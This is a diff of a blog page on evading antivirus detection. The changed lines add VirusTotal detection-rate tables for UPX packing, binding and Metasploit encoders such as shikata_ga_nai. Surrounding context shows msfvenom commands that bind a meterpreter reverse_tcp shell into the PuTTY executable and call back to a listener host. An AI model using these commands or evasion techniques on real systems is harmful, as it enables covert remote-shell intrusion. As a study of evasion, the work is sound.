@@ -89,7 +89,7 @@
 <script src="https://bananamafia.dev/js/bootstrap.min.js"></script>
 
 
-<script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script> <meta name="generator" content="Hugo 0.60.1" />
+<script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script> <meta name="generator" content="Hugo 0.62.0" />
         
 
         
@@ -190,7 +190,16 @@
 </code></pre><p>All scans are performed on <a href="https://www.virustotal.com">VirusTotal</a>. Please not that this covers static analysis only. However, it will become clear later on that dynamic analysis of the used techniques aren't required at all.</p>
 <h2 id="packers">Packers</h2>
 <p>Packers compress malware and decompress it at runtime using an embedded decompression stub. Using the packer <code>UPX</code> seems to be suspicious as the detection rates increase by using a packer:</p>
-<!-- raw HTML omitted -->
+<table width=100% border=1>
+	<tr>
+		<td align="center" valign="middle"><b>Without Packer</b></td>
+		<td align="center" valign="middle"><sup>39</sup>⁄<sub>56</sub></td>
+	</tr>
+	<tr>
+		<td align="center" valign="middle"><b>With Packer</b></td>
+		<td align="center" valign="middle"><sup>41</sup>⁄<sub>56</sub></td>
+	</tr>
+</table>
 <h2 id="binder">Binder</h2>
 <p>This technique basically combines two executables, a malicious and an ordinary one, into one file. The malicious code will be executed in a separate thread upon startup. This command was used to generate a meterpreter shell in combination with the SSH client PuTTY:</p>
 <pre><code>msfvenom
@@ -204,11 +213,37 @@
   -f exe
   -o meter.exe
 </code></pre><p>A slight decrease of detections can be seen:</p>
-<!-- raw HTML omitted -->
+<table width=100% border=1>
+	<tr>
+		<td align="center" valign="middle"><b>Without Binder</b></td>
+		<td align="center" valign="middle"><sup>39</sup>⁄<sub>56</sub></td>
+	</tr>
+	<tr>
+		<td align="center" valign="middle"><b>With Binder</b></td>
+		<td align="center" valign="middle"><sup>33</sup>⁄<sub>56</sub></td>
+	</tr>
+</table>
 <h2 id="encoders">Encoders</h2>
 <p>Using Encoders, the malicious payload will be obscured. There are many different approaches for this, however the polymorphic encoder <code>shikata_ga_nai</code> is one of the most widely used ones. When executing a encoded malware file, the entry point of the decoding method will be called. The payload will then be decoded and executed.</p>
 <p>The results are the following:</p>
-<!-- raw HTML omitted -->
+<table width=100% border=1>
+	<tr>
+		<td align="center" valign="middle"><b>No Encoder</b></td>
+		<td align="center" valign="middle">39/56</td>
+	</tr>
+	<tr>
+		<td align="center" valign="middle"><b>XOR</b></td>
+		<td align="center" valign="middle">33/56</td>
+	</tr>
+	<tr>
+		<td align="center" valign="middle"><b>powershell_x86</b></td>
+		<td align="center" valign="middle">33/56</td>
+	</tr>
+	<tr>
+		<td align="center" valign="middle"><b>shikata_ga_nai</b></td>
+		<td align="center" valign="middle">33/56</td>
+	</tr>
+</table>
 <p>No change in detection rates - let's combine multiple encoders and the binding technique:</p>
 <pre><code>msfvenom -p windows/meterpreter/reverse_tcp
   LHOST=192.168.1.1
